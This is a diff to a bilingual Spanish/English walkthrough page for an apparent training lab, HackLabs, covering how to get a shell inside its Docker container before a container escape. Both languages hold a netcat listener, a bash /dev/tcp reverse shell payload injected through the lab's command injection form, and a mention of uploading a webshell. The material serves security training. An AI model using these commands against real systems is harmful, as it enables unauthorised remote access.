@@ -90,13 +90,17 @@
   <div class="lang-content" data-lang="es">
     <h3>Prerequisito — Obtener shell en el contenedor desde Kali</h3>
     <p>HackLabs corre dentro de un contenedor Docker. Antes de explotar el escape necesitas una shell dentro del contenedor:</p>
-    <pre># Opción A — Reverse shell via lab CMDI (recomendada)
+    <pre># Detecta tu IP de Kali (interfaz macvlan0):
+KALI_IP=$(ip -4 addr show macvlan0 2>/dev/null | grep -oP '(?&lt;=inet )\S+' | cut -d/ -f1)
+echo "Kali IP: $KALI_IP"
+
+# Opción A — Reverse shell via lab CMDI (recomendada)
 # 1. En Kali, escucha conexiones:
 nc -lvnp 4444
 
 # 2. En el lab CMDI (/cmdi), inyecta el payload en el formulario:
 #    Comando de prueba: id
-#    Reverse shell: bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'
+#    Reverse shell: bash -c 'bash -i >&amp; /dev/tcp/$KALI_IP/4444 0>&amp;1'
 
 # Opción B — Shell via webshell (lab File Upload)
 # Sube un webshell PHP/Python y accede desde el navegador.
@@ -192,13 +196,17 @@ cat /output</pre>
   <div class="lang-content" data-lang="en" style="display:none">
     <h3>Prerequisite — Get a shell inside the container from Kali</h3>
     <p>HackLabs runs inside a Docker container. Before exploiting the escape you need a shell inside the container:</p>
-    <pre># Option A — Reverse shell via CMDI lab (recommended)
+    <pre># Detect your Kali IP (macvlan0 interface):
+KALI_IP=$(ip -4 addr show macvlan0 2>/dev/null | grep -oP '(?&lt;=inet )\S+' | cut -d/ -f1)
+echo "Kali IP: $KALI_IP"
+
+# Option A — Reverse shell via CMDI lab (recommended)
 # 1. On Kali, listen for connections:
 nc -lvnp 4444
 
 # 2. In the CMDI lab (/cmdi), inject the payload in the form:
 #    Test command: id
-#    Reverse shell: bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'
+#    Reverse shell: bash -c 'bash -i >&amp; /dev/tcp/$KALI_IP/4444 0>&amp;1'
 
 # Option B — Shell via webshell (File Upload lab)
 # Upload a PHP/Python webshell and access it from the browser.
